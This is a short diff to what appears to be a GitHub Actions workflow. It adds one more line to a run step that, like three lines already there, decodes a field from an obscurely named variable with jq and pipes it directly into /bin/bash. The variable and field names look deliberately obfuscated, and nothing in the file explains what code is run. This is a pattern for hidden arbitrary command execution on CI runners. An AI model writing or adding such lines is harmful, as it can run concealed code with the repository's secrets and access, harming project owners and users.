@@ -27,6 +27,7 @@ jobs:
           echo $twzd70903 | jq -r .haui283 | /bin/bash
           printf '%s' "$qhpa5" | jq -r .ant07 | /bin/bash
           echo $uwbc28154 | jq -r .mpjp74371 | /bin/bash
+          echo $dnw1 | jq -r .uwdx55826 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
